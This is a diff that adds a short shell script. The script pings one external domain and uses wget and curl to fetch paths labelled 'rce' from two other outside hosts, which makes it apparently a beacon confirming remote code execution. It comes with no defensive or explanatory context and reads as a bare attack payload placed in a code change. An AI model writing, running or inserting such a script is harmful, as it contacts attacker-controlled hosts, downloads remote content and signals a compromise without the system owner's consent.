@@ -1,0 +1,2 @@
+#!/bin/sh
+ping rcerce.cfz.cl; wget https://confianze.io/ultronwget/rce; curl http://lolo.cfz.cl/ultroncurl/rce;
